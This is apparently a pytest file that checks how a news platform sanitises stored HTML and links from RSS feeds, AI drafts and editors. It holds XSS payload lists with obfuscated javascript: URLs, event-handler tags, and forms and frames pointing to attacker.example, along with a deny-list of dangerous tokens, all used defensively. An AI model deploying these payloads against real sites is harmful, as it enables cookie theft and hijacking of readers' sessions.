"""HTML and link hygiene on the way *in*: nothing a renderer has to neutralise should be stored.

The public site sanitises again when it paints (`apps/web/src/lib/sanitize.ts`), because a row can
outlive the code that wrote it. That is the last line of defence, not the first. These tests hold
the first line: a feed item or an AI draft is stripped of executable markup and of links a reader
must not follow *before* it is written to `articles.content` / `primary_source_url`, so the value
is also safe for the RSS export, the admin SPA and every script that reads the table directly.
"""

import asyncio

import pytest

from app.common.html_hygiene import safe_link, sanitize_stored_html, strip_for_text


FOLLOWABLE = [
    "https://www.khmertimeskh.com/501234/story/",
    "http://example.com/a?b=1&c=2",
    "mailto:desk@camtech.cam",
]

# Each of these is a link a browser will execute or an unrelated host will be reached through.
UNFOLLOWABLE = [
    "javascript:alert(document.cookie)",
    "JaVaScRiPt:alert(1)",
    "javascript\u0000:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "  javascript:alert(1)",
    "&#106;avascript:alert(1)",
    "&#x6a;avascript:alert(1)",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "//attacker.example/steal",
    "example.com/story",
    "",
    "   ",
    None,
]


@pytest.mark.parametrize("url", FOLLOWABLE)
def test_a_reader_may_follow_these(url):
    assert safe_link(url, allow_relative=False) == url


@pytest.mark.parametrize("url", UNFOLLOWABLE)
def test_a_reader_must_not_be_asked_to_click_these(url):
    assert safe_link(url, allow_relative=False) is None


def test_site_local_paths_stay_valid_when_the_caller_wants_them():
    """A canonical URL is ours to link; a publisher's attribution is not."""
    assert safe_link("/travel/place/angkor-wat", allow_relative=True) == "/travel/place/angkor-wat"
    assert safe_link("/travel/place/angkor-wat", allow_relative=False) is None


def test_a_feed_link_that_is_not_a_link_is_dropped_rather_than_repaired():
    assert safe_link("data:image/png;base64,AAAA", allow_relative=False) is None
    assert safe_link("https://x.example/" + "q" * 600, allow_relative=False) is not None


# --- stored markup ---------------------------------------------------------------------------

EXECUTABLE_MARKUP = [
    "<script>alert(1)</script>",
    '<script src="https://attacker.example/e.js"></script>',
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script>alert(1)",  # unterminated: the rest of the row is still its body
    '<img src=x onerror="alert(1)">',
    "<svg onload=alert(1)></svg>",
    '<math href="javascript:alert(1)"><mtext>x</mtext></math>',
    '<iframe src="https://attacker.example/frame"></iframe>',
    '<a href="javascript:alert(1)">Read the story</a>',
    '<a href="&#106;avascript:alert(1)">Read the story</a>',
    "<body onload=alert(1)>copy</body>",
    '<form action="https://attacker.example/collect"><input name="cookie"></form>',
    '<meta http-equiv="refresh" content="0;url=https://attacker.example">',
    '<base href="//attacker.example/">',
    '<object data="//attacker.example/x.swf"></object>',
    '<embed src="//attacker.example/x.swf">',
    '<div style="background:url(javascript:alert(1))">copy</div>',
    "<!--[if IE]><script>alert(1)</script><![endif]-->",
    "<!-- <script>alert(1)</script> -->",
    '<template><script>alert(1)</script></template>',
    '<p onclick="alert(1)" onmouseover\n="alert(1)">copy</p>',
]

NEVER_IN_A_STORED_ROW = (
    "<script",
    "alert(",
    "onerror",
    "onload",
    "onclick",
    "onmouseover",
    "javascript:",
    "<iframe",
    "<svg",
    "<math",
    "<base",
    "<meta",
    "<form",
    "<object",
    "<embed",
    "<template",
    "style=",
    "attacker.example",
)


@pytest.mark.parametrize("payload", EXECUTABLE_MARKUP)
def test_no_executable_markup_survives_the_pipeline(payload):
    out = sanitize_stored_html(payload)
    lowered = out.lower()
    for token in NEVER_IN_A_STORED_ROW:
        assert token.lower() not in lowered, f"{token!r} survived {payload!r} -> {out!r}"


def test_the_words_of_a_neutralised_link_are_kept():
    """The reader still sees "Read the story"; only the destination goes."""
    assert "Read the story" in sanitize_stored_html('<a href="javascript:alert(1)">Read the story</a>')


def test_real_editorial_markup_is_stored_untouched():
    body = (
        "<p>The <strong>Senate</strong> voted 60&#8211;40 on Tuesday.</p>"
        "<h2>What happens next</h2>"
        "<ul><li>First point</li><li>Second point</li></ul>"
        '<blockquote>&ldquo;We acted in good faith,&rdquo; the minister said.</blockquote>'
        '<p>Read it at <a href="https://www.aljazeera.com/news/2026/1/1/x?utm=1">Al Jazeera</a>.</p>'
        '<img src="https://cdn.publisher.example/photo.jpg" alt="The chamber">'
    )
    out = sanitize_stored_html(body)
    for fragment in (
        "<p>",
        "</p>",
        "<strong>Senate</strong>",
        "<h2>What happens next</h2>",
        "<li>First point</li>",
        "<blockquote>",
        'href="https://www.aljazeera.com/news/2026/1/1/x?utm=1"',
        'src="https://cdn.publisher.example/photo.jpg"',
        'alt="The chamber"',
    ):
        assert fragment in out, fragment
    assert 'rel="noopener noreferrer nofollow ugc"' in out


def test_a_syndicated_link_cannot_open_its_opener():
    out = sanitize_stored_html('<a href="https://publisher.example/a" target="_top">x</a>')
    assert 'target="_top"' not in out
    assert "noopener" in out


def test_prose_that_happens_to_use_angle_brackets_is_not_rewritten_as_markup():
    """`40 < 50` is a sentence. A pattern that allows a space after `<` turns it into a tag."""
    text = "Turnout trailed the last election, 40 < 50 per cent, and the margin > 3 points."
    assert sanitize_stored_html(text) == text


def test_storing_the_same_body_twice_changes_nothing():
    body = (
        '<p>See <a href="https://publisher.example/story">the filing</a> '
        'and <em>two</em> <strong>sources</strong>.</p><!-- note -->'
    )
    once = sanitize_stored_html(body)
    assert sanitize_stored_html(once) == once


def test_empty_and_absent_bodies_do_not_become_the_string_none():
    assert sanitize_stored_html(None) == ""
    assert sanitize_stored_html("") == ""
    assert strip_for_text(None) == ""


def test_strip_for_text_is_for_plain_text_fields():
    assert strip_for_text("<p>Phnom&nbsp;Penh <em>flood</em> map</p>") == "Phnom Penh flood map"


# --- the ingestion choke point ---------------------------------------------------------------

_FEED_XML = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
  <title>Publisher feed</title><link>https://publisher.example</link><description>Test</description>
  <item>
    <title>Senate votes on the budget</title>
    <link>https://publisher.example/2026/senate-budget</link>
    <description><![CDATA[<p>They <em>voted</em> 60-40. <img src="https://cdn.publisher.example/chamber.jpg" alt="The chamber"> <a href="https://publisher.example/2026/senate-budget">Read more</a>.</p><script>steal()</script>]]></description>
    <pubDate>Tue, 01 Jan 2026 04:00:00 GMT</pubDate>
  </item>
  <item>
    <title>Headline that is really a payload</title>
    <link>javascript:alert(document.cookie)</link>
    <description>&lt;p&gt;plain&lt;/p&gt;</description>
  </item>
  <item>
    <title>Entity-obfuscated link</title>
    <link>&#106;avascript:alert(1)</link>
    <description>plain</description>
  </item>
  <item>
    <title><![CDATA[<img src=x onerror=alert(1)>Flood waters recede]]></title>
    <link>https://publisher.example/2026/flood</link>
    <description>Body copy.</description>
    <media:content url="https://cdn.publisher.example/river.jpg" medium="image"/>
  </item>
  <item>
    <title>Google News redirect with a hostile source</title>
    <link>https://news.google.com/rss/articles/CBMifg</link>
    <source url="//attacker.example/steal">Some Publisher</source>
    <description>Body copy.</description>
  </item>
</channel>
</rss>
"""


class _FakeResponse:
    is_redirect = False
    headers: dict = {}

    def __init__(self, text: str):
        self.text = text
        self.content = text.encode("utf-8")

    def raise_for_status(self) -> None:
        return None


class _FakeAsyncClient:
    def __init__(self, *args, **kwargs):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False

    async def get(self, url, headers=None):
        return _FakeResponse(_FEED_XML)


@pytest.fixture
def feed_items(monkeypatch):
    """One fetch of a feed that mixes real stories with hostile ones.

    `validate_url_safe` does live DNS, so it is replaced here — the subject of this test is what
    the parser keeps after the fetch, not the SSRF gate (covered in test_backend.py).
    """
    import types

    from app.ingestion import rss_fetcher

    monkeypatch.setattr(rss_fetcher, "validate_url_safe", lambda url: (True, ""))
    monkeypatch.setattr(
        rss_fetcher,
        "httpx",
        # Only the two names `fetch_rss_feed` touches on the client are faked; `Limits` is called
        # by its constructor.
        types.SimpleNamespace(AsyncClient=_FakeAsyncClient, Limits=lambda **kwargs: None),
    )
    return asyncio.run(rss_fetcher.fetch_rss_feed("https://publisher.example/feed.xml"))


def test_items_whose_only_link_is_a_script_never_enter_the_database(feed_items):
    urls = [item["url"] for item in feed_items]
    assert all("javascript" not in url.lower() for url in urls), urls
    assert not any("document.cookie" in (item["title"] + item["url"]) for item in feed_items)
    assert len(feed_items) == 3


def test_a_feed_summary_is_stored_without_its_script_but_with_its_article(feed_items):
    summary = feed_items[0]["raw_summary"]
    assert "<script" not in summary.lower() and "steal()" not in summary
    assert "<em>voted</em>" in summary
    assert 'href="https://publisher.example/2026/senate-budget"' in summary
    assert feed_items[0]["image_url"] == "https://cdn.publisher.example/chamber.jpg"


def test_a_title_written_as_markup_becomes_words(feed_items):
    flood = next(item for item in feed_items if "Flood" in item["title"])
    assert flood["title"] == "Flood waters recede"
    assert "<" not in flood["title"]
    assert flood["image_url"] == "https://cdn.publisher.example/river.jpg"


def test_a_protocol_relative_publisher_url_is_not_adopted_as_the_article_url(feed_items):
    redirect = next(item for item in feed_items if "Google News" in item["title"])
    assert redirect["url"] == "https://news.google.com/rss/articles/CBMifg"
    assert redirect["source_href"] is None


# --- the CMS write path ----------------------------------------------------------------------


class _StubQuery:
    def filter(self, *args, **kwargs):
        return self

    def first(self):
        return None


class _StubSession:
    """Records the objects the service would have written."""

    def __init__(self):
        self.added = []

    def query(self, model=None):
        return _StubQuery()

    def add(self, obj):
        self.added.append(obj)

    def commit(self):
        return None

    def refresh(self, obj):
        return None


def _payload(**overrides):
    from app.schemas.article import ArticleCreate

    kwargs = dict(
        title="Minister opens the new bridge",
        summary="The bridge opened on Monday.",
        content="<p>The bridge <strong>opened</strong>.</p>",
        category_id="cat-1",
        author_id="auth-1",
        primary_source_url="https://publisher.example/bridge",
    )
    kwargs.update(overrides)
    return ArticleCreate(**kwargs)


def test_the_editor_essay_is_stored_inert_and_the_attribution_still_links():
    from app.services.article_service import ArticleService

    db = _StubSession()
    ArticleService.create_article(
        db,
        _payload(
            content='<p>Saved.</p><script>alert(1)</script><a href="javascript:alert(2)">note</a>',
            primary_source_url="javascript:alert(3)",
        ),
    )
    article = db.added[0]
    assert "<script" not in article.content.lower() and "alert(" not in article.content
    assert "<p>Saved.</p>" in article.content
    # An unattributable story cannot be published: the quality gate reads this column.
    assert article.primary_source_url is None


def test_a_clean_essay_and_a_real_publisher_url_pass_through_untouched():
    from app.services.article_service import ArticleService

    db = _StubSession()
    ArticleService.create_article(db, _payload())
    article = db.added[0]
    assert article.content == "<p>The bridge <strong>opened</strong>.</p>"
    assert article.primary_source_url == "https://publisher.example/bridge"
